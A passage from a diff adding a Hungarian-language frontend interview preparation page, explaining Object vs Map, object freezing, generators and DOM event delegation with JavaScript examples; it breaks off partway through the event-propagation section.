@@ -1,0 +1,3373 @@
+<!DOCTYPE html>
+<html lang="hu">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Nagarro – Interjú témakörök</title>
+  <style>
+    :root{
+      --bg:#f4f6fb;
+      --card:#ffffff;
+      --ink:#1c2233;
+      --muted:#5d6678;
+      --line:#e4e8f0;
+      --brand:#3a5bd9;
+      --brand-soft:#eaeefc;
+      --brand-ink:#2f48ac;
+      --ok:#1f9d57;
+      --ok-soft:#e6f6ec;
+      --ok-line:#bce6cb;
+      --warn:#b9821a;
+      --warn-soft:#fbf2dd;
+      --warn-line:#ecd9a8;
+      --warn-ink:#8a6112;
+      --code-bg:#1e2433;
+      --code-ink:#e8ecf6;
+      --mono:"SF Mono",ui-monospace,SFMono-Regular,Menlo,'Fira Code','Cascadia Code',Consolas,monospace;
+      --shadow:0 1px 2px rgba(20,30,60,.05),0 8px 24px rgba(20,30,60,.07);
+    }
+    *{box-sizing:border-box}
+    html{-webkit-text-size-adjust:100%}
+    body{
+      margin:0;background:var(--bg);color:var(--ink);
+      font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+      line-height:1.65;padding:32px 16px 80px;
+    }
+    .wrap{max-width:900px;margin:0 auto}
+
+    /* Hero */
+    header.hero{
+      background:linear-gradient(135deg,#3a5bd9,#5a78ec);color:#fff;border-radius:18px;
+      padding:34px 34px 30px;box-shadow:var(--shadow);margin-bottom:24px;
+    }
+    header.hero .kicker{text-transform:uppercase;letter-spacing:.14em;font-size:12px;font-weight:700;opacity:.85;margin:0 0 8px;}
+    header.hero h1{margin:0 0 6px;font-size:28px;line-height:1.2;border:none;padding:0;color:#fff;}
+    header.hero p{margin:0;opacity:.94;font-size:15px;max-width:66ch;}
+
+    /* Table of contents */
+    .toc{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:20px 22px;margin-bottom:24px;box-shadow:var(--shadow);}
+    .toc-title{font-size:13px;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);font-weight:800;margin:0 0 14px;}
+    .toc-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(235px,1fr));gap:8px;}
+    .toc-grid a{
+      display:flex;gap:8px;align-items:baseline;text-decoration:none;color:var(--ink);font-size:13.5px;
+      padding:8px 11px;border-radius:8px;border:1px solid var(--line);background:#fbfcfe;transition:background .15s,border-color .15s;
+    }
+    .toc-grid a:hover{background:var(--brand-soft);border-color:#c9d4f7;}
+    .toc-grid a .tnum{color:var(--brand);font-weight:800;flex:0 0 auto;min-width:1.4em;}
+
+    /* Topic cards */
+    .section{
+      background:var(--card);border:1px solid var(--line);border-radius:16px;
+      padding:24px 26px;margin-bottom:20px;box-shadow:var(--shadow);
+      border-left:6px solid var(--brand);scroll-margin-top:16px;
+    }
+
+    h1{color:var(--ink);}
+    h2{font-size:20px;font-weight:800;margin:0 0 10px;color:var(--ink);border:none;padding:0;}
+    h3{font-size:14px;font-weight:800;color:var(--brand-ink);margin:22px 0 8px;letter-spacing:.01em;}
+
+    /* Topic tags */
+    .tag{display:inline-block;background:var(--brand-soft);color:var(--brand);padding:3px 10px;border-radius:999px;font-size:12px;font-weight:600;margin:0 6px 14px 0;}
+
+    p{margin:0 0 12px;font-size:15px;}
+    ul,ol{margin:0 0 14px;padding-left:22px;}
+    li{margin:5px 0;font-size:14.5px;}
+
+    /* Code */
+    code{font-family:var(--mono);font-size:.92em;}
+    :not(pre) > code{background:var(--brand-soft);color:var(--brand-ink);padding:1px 6px;border-radius:5px;}
+    .inline-code{background:var(--brand-soft);color:var(--brand-ink);padding:1px 6px;border-radius:5px;font-family:var(--mono);font-size:.9em;}
+    pre{background:var(--code-bg);border:none;border-radius:10px;padding:14px 16px;overflow-x:auto;margin:14px 0;}
+    pre code{background:none;color:var(--code-ink);padding:0;font-size:13px;line-height:1.55;}
+
+    /* Callout boxes */
+    .note,.warning{border-radius:11px;padding:14px 16px;margin:16px 0;font-size:14px;border:1px solid;}
+    .note{background:var(--brand-soft);border-color:#d3dbf7;}
+    .note strong{color:var(--brand-ink);}
+    .warning{background:var(--warn-soft);border-color:var(--warn-line);}
+    .warning strong{color:var(--warn-ink);}
+    .note ul,.warning ul{margin:8px 0 0;}
+
+    /* Tables */
+    table{width:100%;border-collapse:collapse;margin:14px 0;font-size:13.5px;background:var(--card);}
+    th,td{border:1px solid var(--line);padding:8px 11px;text-align:left;vertical-align:top;}
+    th{background:var(--brand-soft);color:var(--brand-ink);font-weight:700;}
+    table tr:nth-child(even){background:#f7f9fd;}
+
+    footer{color:var(--muted);font-size:13px;text-align:center;margin-top:30px;line-height:1.7;}
+    a{color:var(--brand);}
+
+    @media(max-width:560px){
+      body{padding:20px 10px 60px}
+      header.hero{padding:24px 20px}
+      .section{padding:18px 16px}
+      .toc-grid{grid-template-columns:1fr}
+    }
+  </style>
+</head>
+<body>
+<div class="wrap">
+
+  <header class="hero">
+    <p class="kicker">Nagarro · Frontend interjú</p>
+    <h1>Interjú témakörök – felkészülési segédlet</h1>
+    <p>18 mélységi témakör JavaScript, React, DOM, hálózat, biztonság, teljesítmény és architektúra köréből. Minden témánál működő kód, összehasonlító táblázatok és interjú-tippek.</p>
+  </header>
+
+  <nav class="toc">
+    <p class="toc-title">Témakörök (20)</p>
+    <div class="toc-grid">
+      <a href="#q1"><span class="tnum">1</span> Object vs Map</a>
+      <a href="#q2"><span class="tnum">2</span> Object.preventExtensions()</a>
+      <a href="#q3"><span class="tnum">3</span> Generator függvények</a>
+      <a href="#q4"><span class="tnum">4</span> Event delegation (capture/bubble)</a>
+      <a href="#q5"><span class="tnum">5</span> WebSocket vs SSE</a>
+      <a href="#q6"><span class="tnum">6</span> React: useOptimistic / useTransition</a>
+      <a href="#q7"><span class="tnum">7</span> useState vs useReducer</a>
+      <a href="#q8"><span class="tnum">8</span> Gyerek komponens elérése (ref)</a>
+      <a href="#q9"><span class="tnum">9</span> noopener / noreferrer</a>
+      <a href="#q10"><span class="tnum">10</span> CSS box-sizing</a>
+      <a href="#q11"><span class="tnum">11</span> Redux Toolkit</a>
+      <a href="#q12"><span class="tnum">12</span> var + setTimeout closure</a>
+      <a href="#q13"><span class="tnum">13</span> Objektum laposítás (flatten)</a>
+      <a href="#q14"><span class="tnum">14</span> Web Accessibility (a11y)</a>
+      <a href="#q15"><span class="tnum">15</span> Web Security</a>
+      <a href="#q16"><span class="tnum">16</span> Core Web Vitals</a>
+      <a href="#q17"><span class="tnum">17</span> Microfrontend architektúra</a>
+      <a href="#q18"><span class="tnum">18</span> Event Loop / Concurrency</a>
+      <a href="#q19"><span class="tnum">19</span> TypeScript alapok</a>
+      <a href="#q20"><span class="tnum">20</span> Responsive web design</a>
+    </div>
+  </nav>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- 1. OBJECT VS MAP -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="section" id="q1">
+<h2>1. Object vs Map</h2>
+<span class="tag">JS alapok</span>
+
+<p>A JavaScript-ben az adatot kulcs-érték párokban kétféleképpen tárolhatjuk: a hagyományos <code class="inline-code">Object</code>-tel vagy az ES6-ban bevezetett <code class="inline-code">Map</code>-pel. Bár felületileg hasonlóak, a működésükben és a felhasználási területeikben jelentős különbségek vannak. Az interjún gyakran kérdezik, hogy mikor melyiket érdemes választani.</p>
+
+<h3>1.1 Mikor melyiket használjuk?</h3>
+<table>
+  <tr><th>Szempont</th><th>Object</th><th>Map</th></tr>
+  <tr><td>Kulcs típusa</td><td>Csak <code>string</code> vagy <code>Symbol</code></td><td>Bármilyen típus (obj, fn, szám…)</td></tr>
+  <tr><td>Sorrend</td><td>Nem garantált (bár modern engine-ek tartják a beszúrási sorrendet string kulcsoknál)</td><td>Mindig beszúrási sorrend</td></tr>
+  <tr><td>Méret</td><td><code>Object.keys(o).length</code></td><td><code>map.size</code> – O(1)</td></tr>
+  <tr><td>Iteráció</td><td><code>for...in</code>, <code>Object.entries()</code></td><td><code>for...of</code>, <code>.forEach()</code> – natívan iterable</td></tr>
+  <tr><td>Teljesítmény</td><td>Kevés kulcsnál jó</td><td>Gyakori hozzáadás/törlés esetén gyorsabb</td></tr>
+  <tr><td>Prototípus lánc</td><td>Van (örökli a <code>toString</code> stb.)</td><td>Nincs – tiszta adat-tároló</td></tr>
+  <tr><td>JSON szerializáció</td><td>Natívan támogatott</td><td>Kézzel kell konvertálni</td></tr>
+</table>
+
+<h3>1.2 Kulcs-koerció az Object-nél</h3>
+<p>Az Object-nél <strong>minden kulcs automatikusan string-gé konvertálódik</strong>. Ez meglepő hibákat okozhat, ha nem string típusú kulcsot próbálunk használni. A Map-nél ilyen probléma nem létezik, mert ott a kulcsok típusa megmarad.</p>
+
+<pre><code>// Object – kulcs koerció probléma
+const obj = {};
+const key1 = {};
+const key2 = { name: "másik" };
+
+obj[key1] = "első";
+obj[key2] = "második";
+
+// Mindkét objektum kulcs toString()-gé alakul: "[object Object]"
+console.log(Object.keys(obj)); // ["[object Object]"] – CSAK EGY kulcs!
+console.log(obj[key1]);        // "második" – felülírta!
+
+// Map – nincs koerció, mindkét objektum külön kulcs
+const map = new Map();
+map.set(key1, "első");
+map.set(key2, "második");
+console.log(map.size);        // 2 – mindkettő megmaradt!
+console.log(map.get(key1));   // "első"</code></pre>
+
+<h3>1.3 Object példa</h3>
+<pre><code>const user = { name: "Anna", age: 28 };
+user.email = "anna@example.com";
+
+// Iteráció
+for (const [key, value] of Object.entries(user)) {
+  console.log(`${key}: ${value}`);
+}
+
+// Probléma: ha a kulcs véletlenül "toString"
+const obj = {};
+obj["toString"] = "felülírva!";
+console.log(obj.toString); // "felülírva!" – nem függvény többé!</code></pre>
+
+<h3>1.3 Map példa</h3>
+<pre><code>const map = new Map();
+
+// Bármilyen kulcs használható
+const objKey = { id: 1 };
+const fnKey = () => {};
+
+map.set(objKey, "érték objektum kulccsal");
+map.set(fnKey, "érték függvény kulccsal");
+map.set(42, "érték szám kulccsal");
+
+console.log(map.get(objKey)); // "érték objektum kulccsal"
+console.log(map.size);        // 3
+
+// Iteráció – beszúrási sorrendben
+for (const [key, value] of map) {
+  console.log(key, "=>", value);
+}
+
+// Map &lt;-&gt; Object konverzió
+const fromObj = new Map(Object.entries({ a: 1, b: 2 }));
+const backToObj = Object.fromEntries(fromObj);</code></pre>
+
+<h3>1.5 WeakMap és WeakSet – kapcsolódó adatstruktúrák</h3>
+<p>A <code class="inline-code">WeakMap</code> és <code class="inline-code">WeakSet</code> speciális változatok, amelyeknél a kulcsok (WeakMap) illetve az elemek (WeakSet) <strong>"gyenge" referenciával</strong> vannak tárolva. Ez azt jelenti, hogy ha az adott objektumra máshol már nincs hivatkozás, a garbage collector <strong>automatikusan felszabadíthatja</strong> – nem akadályozza meg a memória felszabadítását.</p>
+
+<pre><code>// WeakMap – kulcs CSAK objektum lehet, nem iterálható, nincs .size
+const cache = new WeakMap();
+
+function heavyComputation(obj) {
+  if (cache.has(obj)) return cache.get(obj);
+
+  const result = /* ... nehéz számítás ... */ obj.value * 2;
+  cache.set(obj, result);
+  return result;
+}
+
+let myObj = { value: 42 };
+heavyComputation(myObj); // cache-be kerül
+
+myObj = null; // Ha nincs több referencia → a GC kitörölheti a cache-ből is!
+// Map-nél ez memóriaszivárgás lenne – a Map megtartaná a referenciát!
+
+// Tipikus használat:
+// - Privát adatok tárolása (class instance → adat)
+// - Cache/memoization (ha az objektum megszűnik, a cache is törlődik)
+// - DOM elemekhez kapcsolt metadata</code></pre>
+
+<div class="note">
+  <strong>Interjú tipp:</strong> Ha gyakran kell kulcsokat hozzáadni/törölni, vagy a kulcs nem string → <code>Map</code>. Ha egyszerű konfigurációs objektumról van szó → <code>Object</code>. Ha memóriaszivárgást akarsz elkerülni objektum-kulcsokkal → <code>WeakMap</code>.
+</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- 2. OBJECT.PREVENTEXTENSIONS() -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="section" id="q2">
+<h2>2. Object.preventExtensions()</h2>
+<span class="tag">JS alapok</span>
+
+<p>A JavaScriptben az objektumok alapértelmezetten teljesen nyitottak: bármikor hozzáadhatunk, törölhetünk vagy módosíthatunk property-ket. Néha azonban korlátozni szeretnénk ezt a rugalmasságot – például egy konfigurációs objektumot szeretnénk "lezárni", hogy véletlenül ne módosítsák. Erre három különböző szintű metódus áll rendelkezésre, amelyek egymásra épülnek.</p>
+
+<h3>2.1 Háromszintű "zárolás"</h3>
+<table>
+  <tr><th>Metódus</th><th>Új prop hozzáadása</th><th>Meglévő prop törlése</th><th>Meglévő prop módosítása</th><th>Ellenőrzés</th></tr>
+  <tr><td><code>Object.preventExtensions()</code></td><td>TILTVA</td><td>Engedélyezve</td><td>Engedélyezve</td><td><code>Object.isExtensible()</code></td></tr>
+  <tr><td><code>Object.seal()</code></td><td>TILTVA</td><td>TILTVA</td><td>Engedélyezve</td><td><code>Object.isSealed()</code></td></tr>
+  <tr><td><code>Object.freeze()</code></td><td>TILTVA</td><td>TILTVA</td><td>TILTVA</td><td><code>Object.isFrozen()</code></td></tr>
+</table>
+
+<h3>2.2 Példák</h3>
+<pre><code>// preventExtensions – nem adhatunk hozzá új property-t
+const car = { brand: "Toyota", year: 2020 };
+Object.preventExtensions(car);
+
+car.brand = "Honda";   // OK – módosítás engedélyezett
+delete car.year;       // OK – törlés engedélyezett
+car.color = "red";     // HIBA strict mode-ban, egyébként csendben ignorálja
+console.log(car.color); // undefined
+
+console.log(Object.isExtensible(car)); // false</code></pre>
+
+<pre><code>// seal – nem adhatunk hozzá ÉS nem törölhetünk
+const config = { debug: true, version: "1.0" };
+Object.seal(config);
+
+config.debug = false;     // OK – módosítás engedélyezett
+delete config.version;    // HIBA strict mode-ban
+config.newProp = "asd";   // HIBA strict mode-ban</code></pre>
+
+<pre><code>// freeze – teljes "read-only" (de SHALLOW!)
+const settings = { theme: "dark", nested: { color: "blue" } };
+Object.freeze(settings);
+
+settings.theme = "light";       // HIBA strict mode-ban
+settings.nested.color = "red";  // EZ MŰKÖDIK! – shallow freeze!
+
+// Deep freeze megoldás:
+function deepFreeze(obj) {
+  Object.freeze(obj);
+  Object.getOwnPropertyNames(obj).forEach(prop => {
+    if (typeof obj[prop] === "object" && obj[prop] !== null && !Object.isFrozen(obj[prop])) {
+      deepFreeze(obj[prop]);
+    }
+  });
+  return obj;
+}</code></pre>
+
+<h3>2.3 Kapcsolódó: Property Descriptors</h3>
+<p>A fenti metódusok valójában a property-k <strong>descriptor-ait</strong> módosítják a háttérben. Minden property-nek van három meta-jellemzője: <code class="inline-code">writable</code> (írható-e az értéke), <code class="inline-code">configurable</code> (törölhető/átdefiniálható-e) és <code class="inline-code">enumerable</code> (megjelenik-e iterációnál). A <code>Object.seal()</code> pl. minden property <code>configurable</code>-jét <code>false</code>-ra állítja, a <code>Object.freeze()</code> ezen felül a <code>writable</code>-t is.</p>
+
+<pre><code>// Property descriptor megtekintése
+const person = { name: "Anna" };
+console.log(Object.getOwnPropertyDescriptor(person, "name"));
+// { value: "Anna", writable: true, enumerable: true, configurable: true }
+
+// Egyedi property definiálása korlátozásokkal
+Object.defineProperty(person, "id", {
+  value: 42,
+  writable: false,      // nem módosítható
+  enumerable: false,     // nem jelenik meg for...in / Object.keys()-ben
+  configurable: false,   // nem törölhető, nem definiálható újra
+});
+
+person.id = 99;           // Csendben ignorálja (strict mode-ban TypeError)
+console.log(person.id);   // 42
+console.log(Object.keys(person)); // ["name"] – az "id" nem jelenik meg!
+
+// Object.freeze() a háttérben ezt csinálja MINDEN property-re:
+// writable: false + configurable: false + megakadályozza az új property-k hozzáadását</code></pre>
+
+<div class="warning">
+  <strong>Fontos:</strong> Mind a három metódus <strong>shallow</strong> – beágyazott objektumokra nem hat. Ha mély zárolás kell, rekurzívan kell alkalmazni. A strict mode nélkül a hibák <strong>csendben</strong> ignorálódnak, ami nehezen debugolható bugokhoz vezethet – mindig használj <code>"use strict"</code>-et vagy ES modulokat (ahol alapértelmezetten strict).
+</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- 3. GENERATOR FUNCTIONS -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="section" id="q3">
+<h2>3. Generator függvények</h2>
+<span class="tag">JS haladó</span>
+
+<h3>3.1 Mi az a generator?</h3>
+<p>Egy speciális függvény, ami <strong>szüneteltethető és újraindítható</strong>. A <code class="inline-code">function*</code> szintaxissal definiáljuk, és a <code class="inline-code">yield</code> kulcsszóval "adja vissza" az értékeket egyenként.</p>
+<p>A normál függvényekkel ellentétben a generator <strong>nem fut le egyszerre</strong>: minden <code class="inline-code">yield</code>-nél megáll, "megjegyzi" az állapotát (lokális változók, végrehajtási pozíció), és a következő <code class="inline-code">.next()</code> hívásra folytatja onnan, ahol abbahagyta. Ezt a viselkedést <strong>lazy evaluation</strong>-nek (lusta kiértékelés) hívjuk – csak akkor számol, amikor kéred az értéket.</p>
+
+<h3>3.2 Alapszintaxis</h3>
+<pre><code>function* numberGenerator() {
+  console.log("Első yield előtt");
+  yield 1;
+  console.log("Első és második yield között");
+  yield 2;
+  console.log("Második yield után");
+  yield 3;
+}
+
+const gen = numberGenerator(); // NEM fut le semmi – csak létrehozza az iterátort
+
+console.log(gen.next()); // "Első yield előtt"     → { value: 1, done: false }
+console.log(gen.next()); // "Első és második..."   → { value: 2, done: false }
+console.log(gen.next()); // "Második yield után"   → { value: 3, done: false }
+console.log(gen.next()); //                        → { value: undefined, done: true }</code></pre>
+
+<h3>3.3 Értékek küldése a generatornak</h3>
+<p>A <code class="inline-code">.next(érték)</code> hívással nemcsak lekérhetjük a következő értéket, hanem <strong>adatot is küldhetünk vissza</strong> a generatorba. Az átadott érték lesz a <code class="inline-code">yield</code> kifejezés visszatérési értéke a generatoron belül. Fontos: az <strong>első</strong> <code>.next()</code> hívás argumentuma mindig figyelmen kívül marad, mert még nincs hol fogadni (nincs előtte yield).</p>
+<pre><code>function* calculator() {
+  const a = yield "Add meg az első számot";
+  const b = yield "Add meg a második számot";
+  return a + b;
+}
+
+const calc = calculator();
+console.log(calc.next());      // { value: "Add meg az első számot", done: false }
+console.log(calc.next(10));    // { value: "Add meg a második számot", done: false }
+                               //   ↑ a 10 lesz az "a" értéke
+console.log(calc.next(20));    // { value: 30, done: true }
+                               //   ↑ a 20 lesz a "b" értéke</code></pre>
+
+<h3>3.4 Végtelen sorozat</h3>
+<p>A generatorok egyik legértékesebb tulajdonsága, hogy <strong>végtelen sorozatokat</strong> tudnak reprezentálni anélkül, hogy végtelen memóriát használnának. Mivel az értékek "igény szerint" (on-demand) generálódnak, egy végtelen ciklus sem okoz problémát – csak annyi értéket kérsz le, amennyire szükséged van.</p>
+<pre><code>function* fibonacci() {
+  let a = 0, b = 1;
+  while (true) {
+    yield a;
+    [a, b] = [b, a + b];
+  }
+}
+
+const fib = fibonacci();
+console.log(fib.next().value); // 0
+console.log(fib.next().value); // 1
+console.log(fib.next().value); // 1
+console.log(fib.next().value); // 2
+console.log(fib.next().value); // 3
+
+// Első 10 Fibonacci szám
+function* take(n, iterable) {
+  let i = 0;
+  for (const val of iterable) {
+    if (i++ >= n) return;
+    yield val;
+  }
+}
+console.log([...take(10, fibonacci())]); // [0, 1, 1, 2, 3, 5, 8, 13, 21, 34]</code></pre>
+
+<h3>3.5 yield* – delegálás</h3>
+<p>A <code class="inline-code">yield*</code> (csillaggal) átadja a vezérlést egy <strong>másik iterálható objektumnak</strong> (másik generator, tömb, string stb.). Addig nem tér vissza az eredeti generatorhoz, amíg a delegált iterátor be nem fejeződik. Ez lehetővé teszi a generatorok <strong>kompozícióját</strong> – kisebb, újrahasználható generatorokból építhetsz összetetteket.</p>
+<pre><code>function* inner() {
+  yield "b";
+  yield "c";
+}
+
+function* outer() {
+  yield "a";
+  yield* inner(); // delegálja a vezérlést az inner generatornak
+  yield "d";
+}
+
+console.log([...outer()]); // ["a", "b", "c", "d"]</code></pre>
+
+<h3>3.6 Gyakorlati felhasználás: egyedi ID generátor</h3>
+<pre><code>function* idGenerator(prefix = "ID") {
+  let id = 1;
+  while (true) {
+    yield `${prefix}-${id++}`;
+  }
+}
+
+const userIds = idGenerator("USER");
+console.log(userIds.next().value); // "USER-1"
+console.log(userIds.next().value); // "USER-2"
+console.log(userIds.next().value); // "USER-3"</code></pre>
+
+<h3>3.7 Az Iterator és Iterable protokoll</h3>
+<p>A generatorok azért működnek <code class="inline-code">for...of</code>-fal, spread operátorral (<code>...</code>) és destructuringgal, mert implementálják az <strong>Iterable protokollt</strong>. Egy objektum iterable, ha van <code class="inline-code">[Symbol.iterator]()</code> metódusa, ami egy iterátort ad vissza (egy objektum <code>.next()</code> metódussal).</p>
+
+<pre><code>// Saját iterable objektum – Symbol.iterator-ral
+const range = {
+  from: 1,
+  to: 5,
+
+  // Ez teszi iterable-lé:
+  [Symbol.iterator]() {
+    let current = this.from;
+    const last = this.to;
+
+    return {
+      next() {
+        return current <= last
+          ? { value: current++, done: false }
+          : { done: true };
+      }
+    };
+  }
+};
+
+console.log([...range]);        // [1, 2, 3, 4, 5]
+for (const n of range) { }     // működik!
+
+// Ugyanez generator-ral – sokkal rövidebb:
+function* range(from, to) {
+  for (let i = from; i <= to; i++) yield i;
+}
+console.log([...range(1, 5)]); // [1, 2, 3, 4, 5]</code></pre>
+
+<h3>3.8 Async generatorok (ES2018+)</h3>
+<p>Az <code class="inline-code">async function*</code> kombinálja az aszinkron és a generator viselkedést: <code>yield</code>-del adja vissza az értékeket, de közben <code>await</code>-tel várhat aszinkron műveletekre. A <code class="inline-code">for await...of</code> ciklussal iterálható.</p>
+
+<pre><code>// Async generator – lapozott API hívás
+async function* fetchAllPages(url) {
+  let page = 1;
+  let hasMore = true;
+
+  while (hasMore) {
+    const res = await fetch(`${url}?page=${page}`);
+    const data = await res.json();
+
+    yield* data.items; // minden elemet egyenként yield-el
+
+    hasMore = data.hasNextPage;
+    page++;
+  }
+}
+
+// Használat:
+for await (const item of fetchAllPages("/api/products")) {
+  console.log(item.name);
+  // Automatikusan betölti a következő oldalt, ha kell
+}</code></pre>
+
+<div class="note">
+  <strong>Interjú tipp:</strong> A generatorok az <strong>Iterator protokollt</strong> implementálják, tehát <code>for...of</code> ciklussal bejárhatók. Érdemes tudni, hogy az <code>async/await</code> is generatorokra épül a háttérben – a Babel transpiler például generatorokká alakítja az async függvényeket régebbi JS verziókhoz.
+</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- 4. EVENT DELEGATION – CAPTURING ÉS BUBBLING -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="section" id="q4">
+<h2>4. Event delegation – Capturing és Bubbling</h2>
+<span class="tag">DOM</span>
+
+<p>A DOM-ban minden esemény (kattintás, billentyűleütés, egérmozgás stb.) egy jól definiált úton halad végig a DOM fán. Ezt az utat <strong>esemény propagációnak</strong> (event propagation) hívjuk. Ennek megértése kulcsfontosságú, mert erre épül az <strong>event delegation</strong> minta, ami az egyik leggyakrabban kérdezett téma interjúkon.</p>
+
+<h3>4.1 Az esemény terjedésének 3 fázisa</h3>
+<p>Amikor egy DOM-ban kattintunk (vagy bármilyen esemény történik), az esemény <strong>3 fázison</strong> halad végig:</p>
+<ol>
+  <li><strong>Capturing fázis</strong> (leszálló): <code>window → document → html → body → ... → célelem</code></li>
+  <li><strong>Target fázis</strong>: Az esemény eléri a tényleges célelemet</li>
+  <li><strong>Bubbling fázis</strong> (felszálló): <code>célelem → ... → body → html → document → window</code></li>
+</ol>
+
+<pre><code>/*
+   Példa DOM struktúra:
+
+   &lt;div id="grandparent"&gt;
+     &lt;div id="parent"&gt;
+       &lt;button id="child"&gt;Kattints!&lt;/button&gt;
+     &lt;/div&gt;
+   &lt;/div&gt;
+
+   Ha a BUTTON-ra kattintunk, az esemény útja:
+
+   CAPTURING (lefelé):
+   window → document → html → body → #grandparent → #parent → #child
+
+   TARGET:
+   #child (itt történt a kattintás)
+
+   BUBBLING (felfelé):
+   #child → #parent → #grandparent → body → html → document → window
+*/</code></pre>
+
+<h3>4.2 Capturing vs Bubbling – addEventListener 3. paramétere</h3>
+<pre><code>const grandparent = document.getElementById("grandparent");
+const parent = document.getElementById("parent");
+const child = document.getElementById("child");
+
+// BUBBLING (alapértelmezett – 3. paraméter: false vagy üres)
+grandparent.addEventListener("click", () => {
+  console.log("Grandparent – BUBBLING");
+}); // false az alapértelmezett
+
+parent.addEventListener("click", () => {
+  console.log("Parent – BUBBLING");
+}, false);
+
+child.addEventListener("click", () => {
+  console.log("Child – TARGET/BUBBLING");
+}, false);
+
+// Ha a child-re kattintunk, a SORREND:
+// 1. "Child – TARGET/BUBBLING"
+// 2. "Parent – BUBBLING"
+// 3. "Grandparent – BUBBLING"</code></pre>
+
+<pre><code>// CAPTURING – 3. paraméter: true (vagy { capture: true })
+grandparent.addEventListener("click", () => {
+  console.log("Grandparent – CAPTURING");
+}, true);
+
+parent.addEventListener("click", () => {
+  console.log("Parent – CAPTURING");
+}, { capture: true });
+
+child.addEventListener("click", () => {
+  console.log("Child – TARGET");
+});
+
+// Ha a child-re kattintunk, a SORREND:
+// 1. "Grandparent – CAPTURING"   ← lefelé halad
+// 2. "Parent – CAPTURING"        ← lefelé halad
+// 3. "Child – TARGET"            ← célelem</code></pre>
+
+<h3>4.3 stopPropagation() és stopImmediatePropagation()</h3>
+<p>Két metódus áll rendelkezésre az esemény terjedésének megállítására. A <code class="inline-code">stopPropagation()</code> megakadályozza, hogy az esemény a következő elemre tovább terjedjen (akár capturing, akár bubbling irányban), de az <strong>ugyanazon elemen lévő többi handler még lefut</strong>. A <code class="inline-code">stopImmediatePropagation()</code> még agresszívebb: ugyanazon az elemen lévő <strong>további handlereket is megakadályozza</strong>.</p>
+<pre><code>// stopPropagation – megállítja a terjedést a következő elem felé
+parent.addEventListener("click", (e) => {
+  e.stopPropagation();
+  console.log("Parent – itt megállt!");
+});
+// → A grandparent-en lévő handler NEM fut le
+
+// stopImmediatePropagation – megállítja UGYANAZON az elemen belül is
+parent.addEventListener("click", (e) => {
+  e.stopImmediatePropagation();
+  console.log("Parent handler 1 – lefut");
+});
+parent.addEventListener("click", () => {
+  console.log("Parent handler 2 – NEM fut le!");
+});</code></pre>
+
+<h3>4.4 Event Delegation – a gyakorlati felhasználás</h3>
+<p>Ahelyett, hogy minden egyes gyerek elemre külön listenert raknánk, a <strong>szülőre</strong> teszünk egyet, és a <code class="inline-code">event.target</code>-ből olvassuk ki, melyik elemre kattintottak.</p>
+
+<pre><code>/*
+  &lt;ul id="todo-list"&gt;
+    &lt;li data-id="1"&gt;Bevásárlás&lt;/li&gt;
+    &lt;li data-id="2"&gt;Takarítás&lt;/li&gt;
+    &lt;li data-id="3"&gt;Főzés&lt;/li&gt;
+  &lt;/ul&gt;
+*/
+
+// ❌ ROSSZ – minden li-re külön listener
+document.querySelectorAll("#todo-list li").forEach(li => {
+  li.addEventListener("click", (e) => {
+    console.log("Kattintott:", e.target.textContent);
+  });
+});
+// Probléma: ha dinamikusan adunk hozzá új li-t, annak NEM lesz listenere!
+
+// ✅ JÓ – event delegation a szülőn
+document.getElementById("todo-list").addEventListener("click", (e) => {
+  // Ellenőrizzük, hogy tényleg li-re kattintottak-e
+  const li = e.target.closest("li");
+  if (!li) return;
+
+  console.log("Kattintott:", li.textContent);
+  console.log("ID:", li.dataset.id);
+});
+// Előnyök:
+// 1. Egyetlen listener az összes elemre
+// 2. Dinamikusan hozzáadott elemekre is működik
+// 3. Kevesebb memóriahasználat</code></pre>
+
+<h3>4.5 event.target vs event.currentTarget</h3>
+<pre><code>document.getElementById("parent").addEventListener("click", (e) => {
+  console.log("target:", e.target);        // AZ elem amire TÉNYLEGESEN kattintottak
+  console.log("currentTarget:", e.currentTarget); // AZ elem amin a LISTENER van
+  // e.target !== e.currentTarget ha egy gyerek elemre kattintottunk
+});</code></pre>
+
+<h3>4.6 preventDefault() vs stopPropagation()</h3>
+<p>Ezt a kettőt gyakran összekeverik, de teljesen más célt szolgálnak:</p>
+<table>
+  <tr><th>Metódus</th><th>Mit csinál?</th><th>Példa</th></tr>
+  <tr><td><code>e.preventDefault()</code></td><td>Megakadályozza az elem <strong>alapértelmezett böngésző-viselkedését</strong>, de az esemény <strong>tovább terjed</strong>.</td><td>Link kattintásnál nem navigál, form submit nem küld kérést, checkbox nem pipálódik be.</td></tr>
+  <tr><td><code>e.stopPropagation()</code></td><td>Megállítja az esemény <strong>terjedését</strong> (bubbling/capturing), de az <strong>alapértelmezett viselkedés megtörténik</strong>.</td><td>A kattintás nem jut el a szülő elemhez, de a link mégis navigál.</td></tr>
+</table>
+
+<pre><code>// Mindkettő együtt:
+document.querySelector("a").addEventListener("click", (e) => {
+  e.preventDefault();     // NEM navigál
+  e.stopPropagation();    // NEM terjed tovább a szülőkhöz
+  console.log("Csak ez fut le, semmi más.");
+});</code></pre>
+
+<h3>4.7 Mely események NEM bubbling-olnak?</h3>
+<p>Nem minden esemény bubblinol! Az alábbi események <strong>nem terjednek felfelé</strong> a DOM fán, ezért event delegation-nel nem tudod őket elkapni a szülőn:</p>
+
+<pre><code>// NEM bubbleling események:
+// - focus / blur          → Helyettük: focusin / focusout (ezek bubbling-olnak!)
+// - mouseenter / mouseleave → Helyettük: mouseover / mouseout (ezek bubbling-olnak!)
+// - load / unload / abort
+// - scroll (csak a target elemen)
+// - resize
+
+// Példa: focus delegation megoldása focusin-nal
+document.getElementById("form").addEventListener("focusin", (e) => {
+  // Ez MŰKÖDIK – a focusin bubbling-ol!
